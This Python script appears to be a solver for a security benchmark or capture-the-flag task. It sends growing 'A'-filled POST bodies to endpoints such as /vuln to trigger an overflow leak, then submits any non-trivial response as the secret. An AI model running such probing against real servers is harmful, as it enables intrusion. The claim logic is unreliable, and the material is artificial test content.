import sys, json, base64, binascii

def send_http(method, path, body_hex=None, headers=None):
    req = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        req["http"]["body_hex"] = body_hex
    if headers:
        req["http"]["headers"] = headers
    print(json.dumps(req), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def probe(path, size):
    payload = b"A" * size
    resp = send_http("POST", path, body_hex=payload.hex())
    body = base64.b64decode(resp.get("body_b64", ""))
    return resp, body

def main():
    # ignore provision argument
    paths = ["/parse", "/record", "/vuln", "/"]
    # try a range of sizes, increasing
    for path in paths:
        for size in [64, 128, 256, 512, 1024, 2048, 4096, 8192]:
            resp, body = probe(path, size)
            # consider a successful secret extraction if response body is non‑empty and not just HTML error
            if body and len(body) > 0:
                # if body looks like printable text, maybe it's an error page; skip short bodies
                if len(body) < 16:
                    continue
                # treat the entire body as the secret (hex encode)
                secret_hex = binascii.hexlify(body).decode()
                claim = {"secret_hex": secret_hex}
                print(f"CLAIM:{json.dumps(claim)}")
                return
    # fallback claim (will be wrong)
    print('CLAIM:' + json.dumps({"secret_hex": ""}))

if __name__ == "__main__":
    main()